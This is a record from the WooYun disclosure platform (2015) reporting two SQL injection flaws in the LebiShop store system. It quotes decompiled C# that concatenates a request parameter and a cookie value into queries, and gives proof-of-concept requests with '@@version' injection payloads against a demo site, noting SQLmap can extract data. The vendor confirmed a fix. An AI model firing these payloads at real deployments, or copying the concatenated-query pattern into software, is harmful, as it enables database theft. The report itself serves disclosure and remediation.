{"id": 39965, "wybug_id": "wooyun-2015-092791", "wybug_title": "LebiShop商城系统最新版两处SQL注入二", "wybug_corp": "www.lebi.cn", "wybug_author": "xfkxfk", "wybug_date": "2015-01-23 11:28", "wybug_open_date": "2015-04-23 11:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-23：\t细节向公众公开  简要描述： LebiShop商城系统最新版两处SQL注入二 详细说明：  LebiShop商城系统最新版两处SQL注入第一处SQL注入/ajax/ajax_user.aspx对应反编译后的文件shop.ajax.ajax_user.UserProduct_Edit方法\n// Shop.Ajax.Ajax_userpublic void UserProduct_Edit(){\tint t = RequestTool.RequestInt(\"type\", 141);\tint num = RequestTool.RequestInt(\"num\", 1);\tint pid = RequestTool.RequestInt(\"pid\", 0);\tstring property = RequestTool.RequestString(\"property\");\tstring propertypriceids = RequestTool.RequestString(\"propertypriceids\");\tint warndays = RequestTool.RequestInt(\"warndays\", 0);\tif (t != 141 && t != 142 && t != 143 && t != 144)\t{\t\tbase.Response.Write(\"{\\\"msg\\\":\\\"OK\\\"}\");\t\treturn;\t}\tif ((t == 141 || t == 144) && this.CurrentUser.id == 0)\t{\t\tbase.Response.Write(string.Concat(new string[]\t\t{\t\t\t\"{\\\"msg\\\":\\\"\",\t\t\tbase.Tag(\"请先登陆\"),\t\t\t\"\\\",\\\"url\\\":\\\"\",\t\t\tbase.URL(\"P_Login\", \"\"),\t\t\t\"\\\"}\"\t\t}));\t\treturn;\t}\tEX_User.UserProduct_Edit(this.CurrentUser, pid, num, t, property, warndays, propertypriceids);\n注意这里的propertypriceids通过RequestTool.RequestString方法获取最后进入了EX_User.UserProduct_Edit函数，跟进\n// Shop.Bussiness.EX_Userpublic static void UserProduct_Edit(Lebi_User CurrentUser, int pid, int num, int t, string property, int warndays, string propertypriceids){\tstring CookieName = \"UserProduct\" + t;\tLebi_Product pro = EX_Product.GetProduct(pid);\tif (pro == null)\t{\t\treturn;\t}\tif ((pro.Type_id_ProductType == 321 || pro.Type_id_ProductType == 322) & (DateTime.Now < pro.Time_Start || DateTime.Now > pro.Time_Expired))\t{\t\treturn;\t}\tif (CurrentUser.id <= 0)\t{\t\tNameValueCollection nv = CookieTool.GetCookie(CookieName);\t\tstring key = \"p\" + pro.id.ToString();\t\tproperty = HttpUtility.UrlEncode(property);\t\tstring userproduct = nv.Get(key);\t\tif (string.IsNullOrEmpty(userproduct))\t\t{\t\t\tnv.Add(key, num.ToString() + \"|\" + property);\t\t}\t\telse\t\t{\t\t\tnv.Set(key, num.ToString() + \"|\" + property);\t\t}\t\tCookieTool.WriteCookie(CookieName, nv, 1);\t\treturn;\t}\tLebi_User_Product upro = B_Lebi_User_Product.GetModel(string.Concat(new object[]\t{\t\t\"user_id=\",\t\tCurrentUser.id,\t\t\" and product_id=\",\t\tpid,\t\t\" and type_id_UserProductType=\",\t\tt\t}));\tdecimal propertyprice = 0m;\tif (propertypriceids != \"\")\t{\t\tList<Lebi_ProPerty> ps = B_Lebi_ProPerty.GetList(\"id in (\" + propertypriceids + \")\", \"\");\t\tforeach (Lebi_ProPerty p in ps)\t\t{\t\t\tpropertyprice += p.Price;\t\t}\t}\n如果propertypriceids不为空\nB_Lebi_ProPerty.GetList(\"id in (\" + propertypriceids + \")\", \"\");\npropertypriceids进入了B_Lebi_ProPerty.GetList方法而且propertypriceids在进入in条件语句时，没有进行处理导致在GetList中propertypriceids没有处理，导致sql注入发送请求：\nhttp://demo.lebi.cn/ajax/ajax_user.aspx?__action=UserProduct_Edit&url=/type=141&propertypriceids=@@version\n\n\n\n\n使用SQLmap即可跑出数据第二处SQL注入\n// Shop.Ajax.Ajax_userpublic void User_Reg(){\tstring verifycode = RequestTool.RequestString(\"verifycode\");\tstring code = CookieTool.GetCookieString(\"CheckCodef\");\tif (code != verifycode)\t{\t\tbase.Response.Write(\"{\\\"msg\\\":\\\"\" + base.Tag(\"验证码错误\") + \"\\\"}\");\t\treturn;\t}\tstring UserName = RequestTool.RequestString(\"UserName\");\tstring PWD = RequestTool.RequestString(\"Password\");\tint count = B_Lebi_User.Counts(\"UserName='\" + UserName + \"'\");\tif (count > 0)\t{\t\tbase.Response.Write(\"{\\\"msg\\\":\\\"\" + base.Tag(\"用户名已注册\") + \"\\\"}\");\t\treturn;\t}\tNameValueCollection nv = CookieTool.GetCookie(\"parentuser\");\tint parentuserid = 0;\tif (!string.IsNullOrEmpty(nv.Get(\"id\")))\t{\t\tstring parentuserid_ = nv.Get(\"id\");\t\tLebi_User puser = B_Lebi_User.GetModel(\"id=\" + parentuserid_);\t\tif (puser != null && this.SYS.IsUsedAgent == \"1\" && B_API.Check(\"plugin_agent\"))\t\t{\t\t\tparentuserid = puser.id;\t\t\tpuser.Count_sonuser++;\t\t\tB_Lebi_User.Update(puser);\t\t}\t}\n注意这里nv = CookieTool.GetCookie(\"parentuser\");从cookie中获取parentuser的值然后如果nv中存在id的键值，则parentuserid_ = nv.Get(\"id\");最后parentuserid_进入B_Lebi_User.GetModel(\"id=\" + parentuserid_);由于在GetModel中，id= parentuserid_，没有处理，也没有单引号保护，导致sql注入在发送请求\nhttp://demo.lebi.cn/ajax/ajax_user.aspx?__Action=User_Reg&url=/UserName=111111asdf&Password=111111&Password1=111111&Email=111111%40111.com&verifycode=02025&RealName=&Sex=%E7%94%B7&Birthday=&MobilePhone=&Phone=&Fax=&QQ=\n设置cookie\nparentuser=id=1 and id=@@version\n\n\n   漏洞证明：     修复方案：  过来，int   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-01-26 15:09 厂商回复： 漏洞已修复，感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}